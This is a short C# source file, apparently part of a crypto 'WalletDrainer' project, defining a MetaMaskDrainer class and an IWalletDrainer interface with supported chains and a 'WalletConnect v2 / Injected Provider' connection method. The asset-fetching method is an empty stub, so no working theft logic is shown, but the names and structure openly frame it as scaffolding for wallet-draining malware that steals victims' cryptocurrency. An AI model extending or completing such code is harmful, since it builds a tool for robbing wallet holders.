using WalletDrainer.Models;

namespace WalletDrainer.Wallets;

public sealed class MetaMaskDrainer : IWalletDrainer
{
    public string WalletName => "MetaMask";
    public string[] SupportedChains => ["ethereum", "bsc", "polygon", "arbitrum", "optimism"];

    public async Task<List<WalletAsset>> GetAssets(string address, string chain, CancellationToken ct = default)
    {
        await Task.CompletedTask;
        return [];
    }

    public bool SupportsChain(string chain) =>
        SupportedChains.Contains(chain, StringComparer.OrdinalIgnoreCase);

    public string GetConnectionMethod() => "WalletConnect v2 / Injected Provider";
}

public interface IWalletDrainer
{
    string WalletName { get; }
    string[] SupportedChains { get; }
    Task<List<WalletAsset>> GetAssets(string address, string chain, CancellationToken ct = default);
    bool SupportsChain(string chain);
}
